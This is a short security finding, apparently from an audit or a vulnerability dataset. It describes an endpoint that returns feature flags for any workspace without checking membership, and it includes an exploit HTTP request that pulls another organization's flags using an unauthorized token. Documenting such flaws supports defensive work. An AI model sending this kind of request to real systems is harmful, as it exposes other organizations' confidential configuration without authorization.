diagnosis: The bootstrap flags endpoint evaluates and returns all feature flag values for workspace_id passed in the path. It does not verify that current_user is a member of that workspace, exposing confidential feature rollouts, experimental endpoints, and security toggles of other organizations.
exploit_request:
GET /features/bootstrap/ws_enterprise_target_99 HTTP/1.1
Host: app.portal.com
Authorization: Bearer <unauthorized_jwt>
